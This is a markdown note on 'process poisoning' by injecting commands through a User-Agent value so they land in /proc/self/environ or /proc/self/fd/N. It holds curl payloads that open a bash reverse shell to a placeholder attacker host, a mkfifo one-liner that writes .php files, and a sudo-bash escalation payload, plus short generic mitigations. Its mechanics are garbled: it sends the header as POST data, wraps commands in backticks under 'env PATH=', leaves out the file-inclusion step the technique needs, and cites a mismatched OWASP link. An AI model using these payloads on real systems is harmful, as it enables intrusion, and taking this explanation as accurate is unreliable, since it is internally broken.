# 🕸️ Process Poisoning - /proc/self/environ, /proc/self/fd/N via User-Agent header injection

> [!ABSTRACT] Overview of the process poisoning technique using /proc/self/environ and /proc/self/fd/N through User-Agent header injection.

---

## 🔍 Initial Exploitation Methodology

The exploitation method involves injecting malicious payloads into HTTP headers, specifically targeting the `User-Agent` field. This can lead to command execution within a vulnerable application or service.

> [!NOTE] Vulnerability Context
>
> The vulnerability lies in how certain applications handle input from environment variables and file descriptors. Malicious code injected via the `User-Agent` header can be executed if the target process improperly handles these inputs.

---

### Step-by-Step Process Poisoning

1. Identify a vulnerable web application or service that does not properly sanitize HTTP headers.
2. Craft an exploit payload designed to inject commands through the User-Agent header.
3. Send the crafted request to the server, triggering the injection of malicious code into `/proc/self/environ` or `/proc/self/fd/N`.
4. Monitor the target process for signs of successful command execution.

> [!CHECK] Verification Steps
>
> Ensure that the injected payload is correctly placed in the targeted environment variables by inspecting `/proc/<PID>/environ`.

---

## 📝 Technical Details

### Environment Variables & File Descriptors

- **Environment Variables**: The `User-Agent` header can be mapped to an environment variable, allowing for code injection.
  - Example: `env PATH=`[`evil_code`]`:`$PATH`; /bin/bash`

- **File Descriptors**: By manipulating file descriptors, it's possible to redirect I/O operations to a controlled input stream.
  - Example: `fd=3;mkfifo /tmp/f;cat /tmp/f >~/$0.$RANDOM.$RANDOM.$$.php 2>&1 <&$fd &`

> [!EXAMPLE] Payload Injection
>
```bash
curl -X POST --data "User-Agent=$(echo -e 'env PATH=`/bin/bash -i >& /dev/tcp/<attacker-ip>/<port> 0<&1`')\r\n" http://<target-url>/endpoint
```

---

## 📜 Exploitation Scenarios

### Scenario: Injecting a Reverse Shell via User-Agent Header

- **Objective**: Gain remote shell access to the target system.
- **Payload**:
```bash
curl -X POST --data "User-Agent=$(echo -e 'env PATH=`/bin/bash -i >& /dev/tcp/<attacker-ip>/<port> 0<&1`')\r\n" http://<target-url>/endpoint
```
- **Monitoring**: Listen for incoming connections on the attacker's machine.

### Scenario: Privilege Escalation

- **Objective**: Gain elevated privileges by exploiting misconfigured file permissions or processes.
- **Payload**:
```bash
curl -X POST --data "User-Agent=$(echo -e 'env PATH=`/usr/bin/sudo /bin/bash`\r\n')" http://<target-url>/endpoint
```

> [!WARNING] Potential Risks
>
> This method can lead to severe security issues if not properly mitigated. Ensure that the target application does not expose sensitive operations via HTTP headers.

---

## 📐 Mitigation Strategies

### Hardening Web Applications

- Validate and sanitize all input, including User-Agent headers.
- Restrict access to sensitive environment variables and file descriptors.
  
### System Configuration

- Disable unnecessary services and minimize attack surfaces.
- Regularly update software to patch known vulnerabilities.

> [!NOTE] Best Practices
>
> Implementing strict security policies and regular audits can prevent such attacks from succeeding.

---

## 📄 Additional Resources

For further reading on process poisoning techniques, refer to the following resources:

- OWASP Guide: https://owasp.org/www-project-top-ten/2017/A3_2017_Sensitive_Data_Exposure.html
- CTF Challenges: http://ctfchallenge.example.com/process-poisoning

> [!SUCCESS] Exploitation Success
>
> If the payload is successfully injected, observe for signs of command execution within `/proc/self/environ` or `/proc/self/fd/N`.